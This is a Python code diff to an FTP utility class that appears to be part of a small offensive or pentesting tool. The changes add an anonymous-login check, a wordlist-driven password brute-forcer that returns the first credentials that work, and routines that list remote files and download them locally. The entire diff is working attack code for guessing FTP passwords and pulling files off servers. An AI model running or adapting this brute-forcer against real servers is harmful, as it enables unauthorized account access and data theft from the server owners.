@@ -1,4 +1,6 @@
 from ftplib import FTP
+import os
+import sys
 
 ###### make it faster
 # list files
@@ -9,85 +11,88 @@ class ftpThings:
 	def __init__(self):
 		pass
 
-	def checkAnonymousLogin(self, host):
+	def checkAnonymousLogin(self, host, port):
 		try:
-			ftp = FTP(host)
+			ftp = FTP()
+			ftp.connect(host, port)
 			ftp.login()
 			ftp.quit()
 			return True
 		except:
 			return False
 
-	def login(self, host, username, password):
+	def login(self, host, port, username, password):
 		try:
 			ftp = FTP(host)
 			ftp.login(username, password)
 			ftp.quit()
+			print(" "*int(os.get_terminal_size()[0] - 1), end="\r")
 			print(f"username: {username}, password: {password} worked")
+
+			return username, password
 			# if worked, username & password creds are true
 		except:
 			# creds are wrong
-			print(f"username: {username}, password: {password} not worked")
+			print(" "*int(os.get_terminal_size()[0] - 1), end="\r")
+			print(f"username: {username}, password: {password} not worked", end="\r")
 			pass
 
-	def bruteForce(self, host, username, wordlist):
+	def bruteForce(self, host, port, username, wordlistFile):
 		try:
-			for word in wordlist:
-				word = word.strip()
-				self.login(host, username, word)
+			with open(wordlistFile) as handle:
+				words = handle.read().split("\n")
+				for word in words:
+					word = word.strip()
+					result = self.login(host, port, username, word)
+					if result:
+						return result
 		except Exception as e:
 			print(e)
-			# pass
 
-	def listFiles(self, host, username='', password=''):
-		ftp = FTP(host)
+	def downloadFile(self, host, port, path, filename, username='', password=''):
+		ftp = FTP()
+		ftp.connect(host, port)
 
 		if username and password:
 			ftp.login(username, password)
-
 		else:
 			ftp.login()
 
-		files = ftp.nlst(ftp.pwd())
+		try:
+			os.mkdir(str(os.getcwd()) + "/files/ftpFiles/")
+		except:
+			# folder exists or there is a problem :/
+			pass
+
+		handle = open(str(os.getcwd()) + "/files/ftpFiles/" + filename, "wb")
+		ftp.retrbinary("RETR " + path + filename, handle.write)
+
+		ftp.quit()
+
+	def listFiles(self, host, port, foldername='', username='', password=''):
+		ftp = FTP()
+		ftp.connect(host, port)
+
+		if username and password:
+			ftp.login(username, password)
+		else:
+			ftp.login()
+
+		if foldername:
+			path = foldername
+		else:
+			path = ftp.pwd()
+
+		files = ftp.nlst(path)
 		if files:
 			for file in files:
-				if int(len(ftp.nlst(ftp.pwd() + file)) > 0):
+				pathWithFile = ftp.nlst(path + file)
+				if int(len(pathWithFile)) == 1 and pathWithFile[0] == file:
 					print(f"file found -> {file}")
+					answer = input(f"download? (Y/y)")
+					if answer == "Y" or answer == "y":
+						self.downloadFile(host, port, path, file, username, password)
 				else:
 					print(f"folder found -> {file}")
-
-				print(f"object {file} len -> {len(ftp.nlst(ftp.pwd() + file))}")
 		else:
 			print("no file found")
-def main():
-	isAnonymousAllowed = False
-
-	host = "localhost"
-
-	wordlist = ["sifre", "parola", "password", "pwd1234", "12356", "123456789", "ftptest123"]
-
-
-	print(f"Checking for anonymous login on {host}")
-
-	isAnonymousAllowed = ftpThings().checkAnonymousLogin(host)
-
-	if isAnonymousAllowed:
-		print("anonymous login is allowed")
-
-		print("looking for files")
-
-		ftpThings().listFiles(host)
-
-	else:
-		print("anonymous login is not allowed")
-
-		print("testing ftptest user")
-
-		ftpThings().listFiles(host, "ftptest", "ftptest123")
-
-
-
-	# ftpThings().ftpBruteForce("localhost", "ftptest", wordlist)
-
-if __name__ == "__main__":
-	main()
